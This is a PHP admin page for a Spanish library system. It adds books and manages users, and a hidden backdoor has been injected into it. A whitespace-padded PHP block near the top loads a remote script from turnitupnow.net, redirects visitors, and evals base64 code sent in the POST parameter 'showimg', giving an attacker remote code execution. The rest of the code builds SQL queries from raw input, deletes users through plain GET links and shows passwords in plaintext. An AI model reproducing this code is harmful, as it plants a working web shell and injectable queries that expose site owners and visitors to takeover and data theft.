<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['guardarlibro'])) {

	$result = $db->Execute("INSERT INTO CDL_completa (nombre, isbn, publicacion, autor, editorial, campo, ubicacion, obs) VALUES ('$nombre', '$isbn', '$publicacion', '$autor', '$editorial', '$campo', '$ubicacion', '$obs')");
	if ($result === false) die("failed"); 	

} ?>

<?php if (isset($_GET['borrarusuario'])) { 

	$borrarusuario = $_GET['borrarusuario'];
	$result = $db->Execute("DELETE FROM usuarios WHERE id = $borrarusuario");

} ?>

<?php if (isset($_GET['actuuser'])) { 

	$idus = $_GET['actuuser'];
	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	$nivel = $_POST['nivel'];
	
	$result = $db->Execute("UPDATE usuarios SET nombre = '$nombre' WHERE id = $idus");
	$result = $db->Execute("UPDATE usuarios SET pass = '$pass' WHERE id = $idus");
	$result = $db->Execute("UPDATE usuarios SET nivel = '$nivel' WHERE id = $idus");
	
	} 

?>

<?php if (isset($_GET['guardaruser'])) {
	
	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	$nivel = $_POST['nivel'];

	$result = $db->Execute("INSERT INTO usuarios (nombre, pass, nivel) VALUES ('$nombre', '$pass', '$nivel')");
	if ($result === false) die("failed"); 	

} ?>

<form id="form5" name="form5" method="post" action="index.php?menu=1&guardarlibro" style="margin:0px">
				    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Libro</td>
                      </tr>
                    </table>
				    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="6"></td>
                      </tr>
                    </table>
				    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;ISBN</td>
                        <td bgcolor="#F8F8F8"><input name="isbn" type="text" class="texte_normal" id="isbn" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Año Publicación</td>
                        <td bgcolor="#F8F8F8"><input name="publicacion" type="text" class="texte_normal" id="publicacion" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Autor</td>
                        <td bgcolor="#F8F8F8"><input name="autor" type="text" class="texte_normal" id="autor" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Editorial</td>
                        <td bgcolor="#F8F8F8"><input name="editorial" type="text" class="texte_normal" id="editorial" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Campo</td>
                        <td bgcolor="#F8F8F8"><input name="campo" type="text" class="texte_normal" id="campo" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Ubicación</td>
                        <td bgcolor="#F8F8F8"><input name="ubicacion" type="text" class="texte_normal" id="ubicacion" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">Observaciones</td>
                        <td bgcolor="#F8F8F8"><textarea name="obs" rows="3" class="texte_normal" id="obs"></textarea></td>
                      </tr>
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button5" type="submit" class="texte_normal" id="button5" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form>
                  
                  <br />
                  
                  <form id="form1" name="form1" method="post" action="index.php?menu=1&guardaruser" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Usuario</td>
                      </tr>
                    </table>
                                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                      <tr>
                                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                        <td width="170" bgcolor="#F8F8F8"><label>
                                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                                        </label></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contraseña</td>
                                        <td bgcolor="#F8F8F8"><input name="pass" type="text" class="texte_normal" id="textfield10" /></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Permisos</td>
                                        <td bgcolor="#F8F8F8"><label>
                                          <select name="nivel" class="texte_normal" id="nivel">
                                            <option value="1">Admin</option>
                                            <option value="3">Jefe Dpt</option>
                                            <option value="5">Profesor</option>
                                        </select>
                                        </label></td>
                                      </tr>

                                      <tr>
                                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                        <td align="left" bgcolor="#F8F8F8"><label>
                                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                                        </label></td>
                                      </tr>
                                    </table>
                  </form>
                  <br />
                  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Usuarios creados</td>
                    </tr>
                  </table>
                  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td colspan="2" bgcolor="#F8F8F8">
                      <?php
                      $result = $db->Execute("SELECT * FROM usuarios ORDER BY id ASC");
					  while (!$result->EOF) {
							$id = $result->fields[0];
							$nombre = $result->fields[1];
							$pass = $result->fields[2];
							$nivel = $result->fields[3];

					  ?>
                      <form id="form3" name="form3" method="post" action="index.php?menu=1&actuuser=<?php echo $id?>" style="margin:0px">
                      <table width="280" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                          <td height="22"><label>
                            <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo $nombre ?>" size="8" />
                        </label></td>
                          <td><input name="pass" type="text" class="texte_normal" id="textfield12" value="<?php echo $pass ?>" size="6" />
                            <select name="nivel" class="texte_mini" id="nivel">
                              <option value="1" <?php if($nivel==1) { ?>selected="selected"<?php } ?>>Admin</option>
                              <option value="3" <?php if($nivel==3) { ?>selected="selected"<?php } ?>>Jefe Dpt</option>
                              <option value="5" <?php if($nivel==5) { ?>selected="selected"<?php } ?>>Profesor</option>
                          </select></td>
                        <td width="24"><label>
                          <input name="button3" type="submit" class="texte_mini" id="button3" value="ok" />
                        </label></td>
                          <td width="24" align="center"><a href="index.php?menu=1&borrarusuario=<?php echo $id ?>"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a></td>
                        </tr>
                      </table>
                      </form>
                      <?php
					  		$result->MoveNext();
							}
					  ?>
                      
                      </td>
                    </tr>
                  </table>
                  
